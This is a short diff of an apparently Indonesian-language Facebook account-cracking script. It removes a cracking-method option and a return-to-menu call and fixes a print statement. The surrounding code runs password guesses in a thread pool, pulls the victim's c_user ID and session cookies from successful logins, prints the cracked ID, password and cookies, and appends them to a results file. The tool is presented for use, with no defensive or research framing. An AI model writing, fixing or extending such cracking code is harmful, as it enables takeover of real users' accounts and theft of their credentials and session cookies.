@@ -713,8 +713,6 @@ def setting():
 		method.append('metod2')
 	elif hc in ['3','03']:
 		method.append('metod3')
-	elif hc in ['4','04']:
-		method.append('metod4')
 	else:
 		method.append('metod1')
 	print('')
@@ -783,7 +781,6 @@ def passwrd():
 				pool.submit(crack,idf,pwv)
 	print(f'[[blue]•]{H2} OK : {H2}%s '%(ok))
 	print(f'[[blue]•]{K2} CP : {K2}%s '%(cp))
-	kembali()
 	
 def kembali():
 	prints(f'{B2}Ketik "back" Untuk kembali kemenu crack')
@@ -1399,7 +1396,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
-				print(f'\r├──> ID  : {b}{idf}{N} |{ PW  : {hh}{pw}{N}\n└──>  TAHUN : {hh}{thnb}{N}\n└──>  KUKIS : {hh}{kuki}{N}\n└──> UGENT : {u}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N}')
+				print(f'\r├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {hh}{thnb}{N}\n└──>  KUKIS : {hh}{kuki}{N}\n└──> UGENT : {u}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 			else:
 				continue
